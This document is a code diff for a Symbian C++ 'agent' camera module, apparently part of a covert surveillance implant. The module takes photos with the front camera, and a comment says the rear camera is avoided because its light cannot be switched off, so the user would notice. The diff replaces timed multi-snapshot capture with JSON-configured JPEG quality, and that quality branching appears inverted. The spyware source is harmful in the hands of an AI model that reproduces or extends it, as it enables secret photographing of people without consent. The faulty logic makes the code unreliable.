@@ -7,6 +7,7 @@
 
 #include "AgentCamera.h"
 #include "LogFile.h"
+#include "Json.h"
 
 #include <ICL\ImageData.h>
 #include <ICL\ImageCodecData.h>
@@ -25,7 +26,6 @@ CAgentCamera::CAgentCamera() :
 
 CAgentCamera::~CAgentCamera()
 	{
-	delete iTimer;
 	if(iEngineState!=EEngineNotReady)
 		{
 		if(iCamera->ViewFinderActive())
@@ -58,19 +58,47 @@ void CAgentCamera::ConstructL(const TDesC8& params)
 	{
 	BaseConstructL(params);
 	
-	TUint8* ptr = (TUint8 *)iParams.Ptr();
-	TUint32 interval=0;               // time interval, in milliseconds, among two snapshots
-	Mem::Copy( &interval, ptr, 4);
-	ptr += 4;
-	if(interval < 1000)
+	//retrieve parameters
+	RBuf paramsBuf;
+					
+	TInt errCreate = paramsBuf.Create(2*params.Size());
+	if(errCreate == KErrNone)
 		{
-		interval = 1000;
+		paramsBuf.Copy(params);
 		}
-	iSecondsInterv = (interval / 1000);		//time interval in seconds
-		
-	Mem::Copy(&iNumStep,ptr,4 );		// number of snapshots to take
-	
-	iTimer = CTimeOutTimer::NewL(*this);
+	else
+		{
+		//TODO: not enough memory
+		}
+				
+	paramsBuf.CleanupClosePushL();
+	CJsonBuilder* jsonBuilder = CJsonBuilder::NewL();
+	CleanupStack::PushL(jsonBuilder);
+	jsonBuilder->BuildFromJsonStringL(paramsBuf);
+	CJsonObject* rootObject;
+	jsonBuilder->GetDocumentObject(rootObject);
+	if(rootObject)
+		{
+		CleanupStack::PushL(rootObject);
+		//get image quality
+		TBuf<8> qualityBuf;
+		rootObject->GetStringL(_L("quality"),qualityBuf);
+		if(qualityBuf.Compare(_L("hi")))
+			{
+			iQuality = 100;
+			}
+		else if(qualityBuf.Compare(_L("med")))
+			{
+			iQuality = 90;
+			}
+		else
+			{
+			iQuality = 80;
+			}
+		CleanupStack::PopAndDestroy(rootObject);
+		}
+	CleanupStack::PopAndDestroy(jsonBuilder);
+	CleanupStack::PopAndDestroy(&paramsBuf);
 	
 	// we are only interested in front camera:
 	// unfortunately, we can't set rear camera light off during shooting... so we can't use rear camera
@@ -121,17 +149,9 @@ void CAgentCamera::StartAgentCmdL()
 	if(iCameraIndex == -1)
 		return;
 	
-	// set timer
-	TTime time;
-	time.HomeTime();
-	time += iSecondsInterv;
-	iTimer->RcsAt(time);
-	
-	iPerformedStep=0;
 	//prepare camera if another snapshot is not ongoing
 	if(iEngineState==EEngineNotReady)
 		{
-		++iPerformedStep;
 		iEngineState = EEngineReserving;
 		iCamera->Reserve();  //at completion ReserveComplete() is called.
 		}	
@@ -139,7 +159,6 @@ void CAgentCamera::StartAgentCmdL()
 
 void CAgentCamera::StopAgentCmdL()
 	{
-	iTimer->Cancel();
 	if(iEngineState!=EEngineNotReady)
 		{
 		if(iCamera->ViewFinderActive())
@@ -153,26 +172,6 @@ void CAgentCamera::StopAgentCmdL()
 		}
 	}
 
-
-
-void CAgentCamera::TimerExpiredL(TAny* src)
-	{
-	++iPerformedStep;
-	if(iPerformedStep < iNumStep)
-		{
-		// set timer again
-		TTime time;
-		time.HomeTime();
-		time += iSecondsInterv;
-		iTimer->RcsAt(time);
-		}
-	//prepare camera if another snapshot is not ongoing
-	if(iEngineState==EEngineNotReady)
-		{
-		iEngineState = EEngineReserving;
-		iCamera->Reserve();  //calls ReserveComplete() when complete
-		}
-	}
 
 void CAgentCamera::ReserveComplete(TInt aError)
 	{
@@ -304,7 +303,7 @@ HBufC8* CAgentCamera::GetImageBufferL(CFbsBitmap* aBitmap)
 		CleanupStack::PushL(frameImageData);
 		TJpegImageData* imageData = new (ELeave) TJpegImageData();
 		imageData->iSampleScheme  = TJpegImageData::EColor444;
-		imageData->iQualityFactor = 75; // 80 low, set 90 for normal or 100 for high 
+		imageData->iQualityFactor = iQuality; // 80 low, set 90 for normal or 100 for high 
 		frameImageData->AppendImageData(imageData);
 		// convert to jpeg synchronously
 		HBufC8* imageBuf = NULL;
